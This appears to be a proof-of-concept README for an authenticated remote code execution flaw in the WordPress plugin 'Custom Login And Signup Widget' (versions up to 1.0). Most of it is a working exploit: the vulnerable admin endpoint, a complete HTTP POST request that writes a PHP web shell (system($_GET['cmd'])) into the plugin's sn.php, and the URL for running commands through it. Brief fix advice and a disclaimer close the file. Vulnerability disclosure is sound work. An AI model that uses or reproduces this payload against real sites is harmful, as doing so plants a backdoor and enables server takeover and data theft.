
# 🚨 WordPress Custom Login And Signup Widget Plugin <= 1.0 - Arbitrary Code Execution (RCE)

## 🐞 Vulnerability Summary

**Improper Control of Generation of Code ('Code Injection')** vulnerability in `bitto.Kazi Custom Login And Signup Widget` allows arbitrary PHP code execution by authenticated admin users.  
This issue affects all versions **up to and including 1.0**.

> 🔥 **Base Score:** 9.1 (CRITICAL)  
> **CWE ID:** CWE-94 – Improper Control of Generation of Code ('Code Injection')

---

## 🧠 Description

The plugin allows administrators to modify the contents of `sn.php` via the **Sender’s Name** field in the settings page.  
User-supplied input is **written directly into a PHP file** without sanitization or validation.

As a result, any PHP code provided in the `text` parameter will be stored inside a PHP file and executed upon direct request, leading to **remote code execution (RCE)**.

---

## 📍 Vulnerable Endpoint

```
/wp-admin/options-general.php?page=custom-login-and-signup-widget&editbn1=yes
```

---

## 📥 Request (Burp Suite Format)

```http
POST /wp-admin/options-general.php?page=custom-login-and-signup-widget&editbn1=yes HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://target.com/wp-admin/options-general.php?page=custom-login-and-signup-widget
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Origin: http://target.com
Connection: keep-alive
Cookie: *<insert your admin cookie here>*
Upgrade-Insecure-Requests: 1
Priority: u=0, i

text=%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E&submit=Submit
```

---

## 💉 Injection Point

- Parameter: `text`
- Type: **POST**
- Role required: **Administrator**
- File affected: `sn.php` (plugin config include)

---

## 🧬 Injected Content Stored in File

```php
<?php
global $bwbn;
if(isset($_GET['cmd'])) system($_GET['cmd']);
?>
```


---

## 📁 File Written To:

```
http://target.com/wp-content/plugins/custom-login-and-signup-widget/content/sn.php
```

After successful injection, access it directly to execute commands via:

```
http://target.com/wp-content/plugins/custom-login-and-signup-widget/content/sn.php?cmd=id
```

---

## 🛡️ Recommendations

- Restrict file write operations.
- Sanitize and validate all inputs before writing to PHP files.
- Never allow dynamic content to be written into `.php` files.

---

## ⚠️ Disclaimer

**This project is created for educational and research purposes only.**  
Any use of the provided information is at your own risk.  
The author assumes no liability for any misuse or damage caused by this content.

---

### ✍️ _By: Khaled_Alenazi (Nxploited)_
